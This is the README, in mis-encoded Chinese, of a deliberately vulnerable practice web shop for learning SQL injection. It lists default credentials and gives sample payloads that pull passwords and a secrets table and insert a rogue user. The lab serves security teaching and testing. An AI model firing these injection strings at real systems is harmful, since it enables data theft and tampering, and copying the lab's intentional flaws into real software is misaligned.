# VulnShop - SQLæ³¨å…¥æµ‹è¯•é¶åœº

```
â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— 
â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â• 
 â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     
  â•šâ•â•â•â•   â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•     
```

**ä¸€ä¸ªä¸“é—¨ç”¨äºSQLæ³¨å…¥æµ‹è¯•å’Œå­¦ä¹ çš„æ¼æ´é¶åœº**

> âš ï¸ **è­¦å‘Š**: æ­¤ç³»ç»Ÿä»…ä¾›å®‰å…¨æµ‹è¯•å’Œæ•™è‚²ç›®çš„ä½¿ç”¨ï¼ç¦æ­¢ç”¨äºéæ³•ç”¨é€”ï¼

## ğŸ“– ç®€ä»‹

VulnShop æ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿçº¿ä¸Šå•†åº—çš„SQLæ³¨å…¥æµ‹è¯•é¶åœºï¼Œä¸“é—¨è®¾è®¡ç”¨äºï¼š

- ğŸ“ **å­¦ä¹ SQLæ³¨å…¥**: äº†è§£å„ç§SQLæ³¨å…¥ç±»å‹çš„åŸç†å’Œåˆ©ç”¨æ–¹å¼
- ğŸ”§ **æµ‹è¯•å·¥å…·**: æµ‹è¯•sqlmapã€Burp Suiteç­‰å®‰å…¨å·¥å…·çš„åŠŸèƒ½
- ğŸ“ **å®‰å…¨åŸ¹è®­**: ä½œä¸ºå®‰å…¨åŸ¹è®­å’ŒCTFæ¯”èµ›çš„ç»ƒä¹ ç¯å¢ƒ

## âœ¨ ç‰¹æ€§

### æ”¯æŒçš„SQLæ³¨å…¥ç±»å‹

| ç±»å‹ | æ¥å£ | è¯´æ˜ |
|------|------|------|
| **Error-based** | POST /api/user/login | åŸºäºé”™è¯¯çš„æ³¨å…¥ï¼Œè¿”å›è¯¦ç»†SQLé”™è¯¯ä¿¡æ¯ |
| **Union-based** | GET /api/user/profile | è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå¯æå–å…¶ä»–è¡¨æ•°æ® |
| **Boolean-based Blind** | GET /api/products/search | å¸ƒå°”ç›²æ³¨ï¼Œé€šè¿‡å“åº”å·®å¼‚åˆ¤æ–­ |
| **Time-based Blind** | GET /api/products/detail | æ—¶é—´ç›²æ³¨ï¼Œé€šè¿‡å“åº”æ—¶é—´åˆ¤æ–­ |
| **Stacked Queries** | GET /api/orders/query | å †å æŸ¥è¯¢ï¼Œå¯æ‰§è¡Œå¤šæ¡SQLè¯­å¥ |
| **Second-order** | POST /api/user/register | äºŒæ¬¡æ³¨å…¥ï¼Œå­˜å‚¨ååœ¨å…¶ä»–ä½ç½®è§¦å‘ |

### éš¾åº¦çº§åˆ«

- **Easy**: æ— ä»»ä½•é˜²æŠ¤ï¼Œæ‰€æœ‰æ³¨å…¥ç±»å‹éƒ½å¯ç”¨
- **Medium**: ç®€å•WAFè¿‡æ»¤ï¼Œå¯é€šè¿‡å¤§å°å†™/ç¼–ç ç»•è¿‡
- **Hard**: ä¸¥æ ¼WAFè¿‡æ»¤ï¼Œéœ€è¦é«˜çº§ç»•è¿‡æŠ€æœ¯

### æŠ€æœ¯æ ˆ

- **åç«¯**: Python 3 + å†…ç½®HTTP Server
- **æ•°æ®åº“**: SQLite3
- **å‰ç«¯**: çº¯HTML + CSS + JavaScript
- **æ— éœ€å¤–éƒ¨ä¾èµ–**ï¼Œå¼€ç®±å³ç”¨

## ğŸš€ å¿«é€Ÿå¼€å§‹

### ç¯å¢ƒè¦æ±‚

- Python 3.7+
- ä»…æ”¯æŒæœ¬åœ°è®¿é—®ï¼ˆ127.0.0.1ï¼‰

### å¯åŠ¨æœåŠ¡

```bash
cd src/vulnTestServer
python server.py
```

æœåŠ¡å°†åœ¨ http://127.0.0.1:9527 å¯åŠ¨ã€‚

### è®¿é—®é¶åœº

1. æ‰“å¼€æµè§ˆå™¨è®¿é—® http://127.0.0.1:9527
2. ä½¿ç”¨æµ‹è¯•è´¦æˆ·ç™»å½•ï¼š
   - ç®¡ç†å‘˜: `admin` / `admin123`
   - æ™®é€šç”¨æˆ·: `test` / `test`

## ğŸ“š è¯¦ç»†æ–‡æ¡£

- [ä½¿ç”¨è¯´æ˜](doc/USAGE.md) - è¯¦ç»†çš„ä½¿ç”¨æŒ‡å—å’Œæµ‹è¯•æ–¹æ³•
- [å…è´£å£°æ˜](doc/DISCLAIMER.md) - æ³•å¾‹å£°æ˜å’Œä½¿ç”¨æ¡æ¬¾

## ğŸ› ï¸ é…ç½®

### ä¿®æ”¹ç«¯å£

ç¼–è¾‘ `config.py`:

```python
HOST = "127.0.0.1"  # ä»…å…è®¸æœ¬åœ°è®¿é—®
PORT = 9527          # ä¿®æ”¹æ­¤å¤„æ›´æ”¹ç«¯å£
```

### åˆ‡æ¢éš¾åº¦

1. é€šè¿‡Webç•Œé¢: è®¿é—®"é…ç½®"é¡µé¢
2. é€šè¿‡API: `POST /api/config` å‘é€ `{"difficulty": "medium"}`
3. ä¿®æ”¹é…ç½®æ–‡ä»¶: ç¼–è¾‘ `config.py` ä¸­çš„ `DIFFICULTY`

### é‡ç½®æ•°æ®åº“

1. é€šè¿‡Webç•Œé¢: è®¿é—®"é…ç½®"é¡µé¢ç‚¹å‡»"é‡ç½®æ•°æ®åº“"
2. é€šè¿‡å‘½ä»¤è¡Œ: `python database.py`

## ğŸ¯ æµ‹è¯•ç¤ºä¾‹

### Error-based æ³¨å…¥

```
POST /api/user/login
Content-Type: application/json

{"username": "admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--", "password": "x"}
```

### Union-based æ³¨å…¥

```
GET /api/user/profile?id=1 UNION SELECT 1,flag,description,4,5,6 FROM secrets--
```

### Boolean-based ç›²æ³¨

```
GET /api/products/search?keyword=test' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--
```

### Time-based ç›²æ³¨

```
GET /api/products/detail?id=1 AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)
```

### Stacked Queries

```
GET /api/orders/query?order_no=ORD20231201001'; INSERT INTO users(username,password,email) VALUES('hacker','hacked','h@h.com');--
```

## ğŸ“Š æ•°æ®åº“ç»“æ„

### users è¡¨
- id, username, password, email, phone, address, balance, is_admin, created_at

### products è¡¨
- id, name, description, price, stock, category, image, is_active, created_at

### orders è¡¨
- id, user_id, product_id, quantity, total_price, status, shipping_address, order_no, created_at

### secrets è¡¨
- id, flag, description, created_at

## âš ï¸ å®‰å…¨é¡»çŸ¥

1. **ä»…åœ¨æœ¬åœ°ä½¿ç”¨**: æœåŠ¡ä»…ç»‘å®š127.0.0.1ï¼Œç¦æ­¢æš´éœ²åˆ°å…¬ç½‘
2. **æµ‹è¯•ç¯å¢ƒéš”ç¦»**: ä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒæˆ–é‡è¦ç³»ç»Ÿä¸Šè¿è¡Œ
3. **åˆæ³•ä½¿ç”¨**: ä»…ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•å’Œå­¦ä¹ ç›®çš„
4. **åŠæ—¶å…³é—­**: ä¸ä½¿ç”¨æ—¶è¯·å…³é—­æœåŠ¡

## ğŸ“ è®¸å¯è¯

æ­¤é¡¹ç›®ä»…ä¾›æ•™è‚²å’Œå®‰å…¨ç ”ç©¶ç›®çš„ä½¿ç”¨ã€‚ä½¿ç”¨å‰è¯·é˜…è¯»[å…è´£å£°æ˜](doc/DISCLAIMER.md)ã€‚

---

**VulnShop** - å®‰å…¨å­¦ä¹ ï¼Œä»å®è·µå¼€å§‹ ğŸ›¡ï¸
